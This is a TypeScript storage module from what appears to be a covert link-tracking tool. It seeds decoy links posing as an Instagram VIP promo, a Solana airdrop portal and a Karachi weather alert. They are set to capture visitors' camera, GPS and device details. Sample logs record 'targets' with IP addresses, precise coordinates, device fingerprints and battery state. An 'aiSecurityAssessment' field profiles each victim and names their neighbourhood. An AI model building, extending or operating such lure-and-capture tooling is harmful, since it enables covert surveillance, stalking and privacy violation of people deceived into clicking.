import { TrackingLink, CaptureLog } from '../types';

const LINKS_KEY = 'ghufran_king_links';
const LOGS_KEY = 'ghufran_king_logs';

const DEFAULT_LINKS: TrackingLink[] = [
  {
    id: 'insta-promo-2026',
    name: 'Instagram VIP Promo Discount',
    targetUrl: 'https://instagram.com',
    decoyType: 'captcha',
    creationDate: '2026-07-15T12:30:00Z',
    clicks: 48,
    captures: 39,
    captureCamera: true,
    captureGps: true,
    captureDevice: true,
  },
  {
    id: 'crypto-airdrop',
    name: 'Solana AirDrop Claim Portal',
    targetUrl: 'https://phantom.app',
    decoyType: 'loading',
    creationDate: '2026-07-18T08:15:00Z',
    clicks: 112,
    captures: 94,
    captureCamera: true,
    captureGps: true,
    captureDevice: true,
  },
  {
    id: 'local-weather',
    name: 'Karachi Real-time Temp Alert',
    targetUrl: 'https://weather.com',
    decoyType: 'weather',
    creationDate: '2026-07-19T14:45:00Z',
    clicks: 15,
    captures: 14,
    captureCamera: false,
    captureGps: true,
    captureDevice: true,
  },
];

const DEFAULT_LOGS: CaptureLog[] = [
  {
    id: 'log-1',
    linkId: 'insta-promo-2026',
    linkName: 'Instagram VIP Promo Discount',
    timestamp: '2026-07-20T06:12:00Z',
    ipAddress: '182.180.124.9',
    country: 'Pakistan',
    city: 'Karachi',
    deviceType: 'Mobile',
    os: 'iOS',
    browser: 'Safari',
    batteryLevel: 0.84,
    isBatteryCharging: false,
    screenResolution: '393x852',
    connectionType: '4g',
    language: 'en-US',
    platform: 'iPhone',
    hardwareConcurrency: 6,
    latitude: 24.8607,
    longitude: 67.0011,
    gpsAccuracy: 12,
    status: 'success',
    aiSecurityAssessment: 'Target device is a secure iPhone 14 Pro. No immediate operational exploits. Geolocation trace confirms high accuracy center in Karachi South near II Chundrigar Road. Screen state active, battery medium.',
  },
  {
    id: 'log-2',
    linkId: 'insta-promo-2026',
    linkName: 'Instagram VIP Promo Discount',
    timestamp: '2026-07-20T04:22:00Z',
    ipAddress: '39.40.15.221',
    country: 'Pakistan',
    city: 'Lahore',
    deviceType: 'Mobile',
    os: 'Android',
    browser: 'Chrome Mobile',
    batteryLevel: 0.95,
    isBatteryCharging: true,
    screenResolution: '412x915',
    connectionType: 'wifi',
    language: 'ur-PK',
    platform: 'Linux armv8l',
    hardwareConcurrency: 8,
    latitude: 31.5204,
    longitude: 74.3587,
    gpsAccuracy: 8,
    status: 'success',
    aiSecurityAssessment: 'Samsung Galaxy flagship detected on Wi-Fi connection. Battery charging. Android Security Patch Level high. Location locked on Gulberg III, Lahore. User language Urdu/English combo.',
  },
  {
    id: 'log-3',
    linkId: 'crypto-airdrop',
    linkName: 'Solana AirDrop Claim Portal',
    timestamp: '2026-07-19T22:18:00Z',
    ipAddress: '82.165.19.23',
    country: 'United Kingdom',
    city: 'London',
    deviceType: 'Desktop',
    os: 'Windows',
    browser: 'Chrome',
    batteryLevel: 1.0,
    isBatteryCharging: true,
    screenResolution: '1920x1080',
    connectionType: 'ethernet',
    language: 'en-GB',
    platform: 'Win32',
    hardwareConcurrency: 16,
    latitude: 51.5074,
    longitude: -0.1278,
    gpsAccuracy: 45,
    status: 'partial',
    aiSecurityAssessment: 'High-end desktop gaming terminal. Windows 11 platform with 16 logical cores. GPS access denied, fell back to ISP-based GeoIP tracking pointing to Greater London area. Target is running behind active fiber broadband.',
  },
  {
    id: 'log-4',
    linkId: 'crypto-airdrop',
    linkName: 'Solana AirDrop Claim Portal',
    timestamp: '2026-07-19T18:05:00Z',
    ipAddress: '104.244.42.1',
    country: 'United States',
    city: 'San Francisco',
    deviceType: 'Desktop',
    os: 'macOS',
    browser: 'Safari',
    batteryLevel: 0.42,
    isBatteryCharging: false,
    screenResolution: '1512x982',
    connectionType: 'wifi',
    language: 'en-US',
    platform: 'MacIntel',
    hardwareConcurrency: 8,
    latitude: 37.7749,
    longitude: -122.4194,
    gpsAccuracy: 15,
    status: 'success',
    aiSecurityAssessment: 'Apple MacBook Pro detected. Operating on battery (42% remaining, discharging). Geolocation places target near South of Market, San Francisco. Extremely fast rendering engine, high retina density screen.',
  },
  {
    id: 'log-5',
    linkId: 'local-weather',
    linkName: 'Karachi Real-time Temp Alert',
    timestamp: '2026-07-20T05:59:00Z',
    ipAddress: '111.88.99.12',
    country: 'Pakistan',
    city: 'Islamabad',
    deviceType: 'Mobile',
    os: 'Android',
    browser: 'Opera Mini',
    batteryLevel: 0.62,
    isBatteryCharging: false,
    screenResolution: '360x780',
    connectionType: '3g',
    language: 'en-US',
    platform: 'Linux',
    hardwareConcurrency: 4,
    latitude: 33.6844,
    longitude: 73.0479,
    gpsAccuracy: 25,
    status: 'success',
    aiSecurityAssessment: 'Low-power Android device utilizing Opera Mini browser. Data saving mode likely active. Cellular connection running on 3G network. Position tracked accurately to Sector F-7, Islamabad.',
  }
];

export const loadLinks = (): TrackingLink[] => {
  const data = localStorage.getItem(LINKS_KEY);
  if (!data) {
    localStorage.setItem(LINKS_KEY, JSON.stringify(DEFAULT_LINKS));
    return DEFAULT_LINKS;
  }
  return JSON.parse(data);
};

export const saveLinks = (links: TrackingLink[]) => {
  localStorage.setItem(LINKS_KEY, JSON.stringify(links));
};

export const loadLogs = (): CaptureLog[] => {
  const data = localStorage.getItem(LOGS_KEY);
  if (!data) {
    localStorage.setItem(LOGS_KEY, JSON.stringify(DEFAULT_LOGS));
    return DEFAULT_LOGS;
  }
  return JSON.parse(data);
};

export const saveLogs = (logs: CaptureLog[]) => {
  localStorage.setItem(LOGS_KEY, JSON.stringify(logs));
};
